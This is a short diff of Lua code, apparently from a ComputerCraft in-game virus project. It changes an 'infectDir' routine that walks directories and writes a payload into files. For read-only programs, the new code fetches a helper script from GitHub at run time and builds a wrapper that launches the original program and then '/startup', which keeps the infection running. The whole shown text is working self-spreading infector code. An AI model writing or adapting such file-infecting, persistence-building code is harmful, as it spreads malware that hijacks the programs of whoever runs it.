@@ -59,7 +59,15 @@ function infectDir(dirName, payload)
         infectDir(fullFile, payload)
       elseif fs.isReadOnly(fullFile) then
         if file ~= "startup" then
-          dump = 'shell.run("' .. fullFile .. '" ' .. arg .. ")\n"
+          if not fs.exists("escapeCSV") then
+            shell.run("openp/github get tacodrake95/CC_V_AV/master/escapeCSV escapeCSV")
+          end
+          
+          dump = 'args = {...}\n'
+          escape = fs.open("escapeCSV")
+          dump = dump .. escape.readAll() .. "\n"
+          escape.close()
+		  dump = dump .. 'shell.run("' .. fullFile .. '" .. escapeCSV(args))\n'
           dump = dump .. 'shell.run("/startup")'
         else
           dump = payload
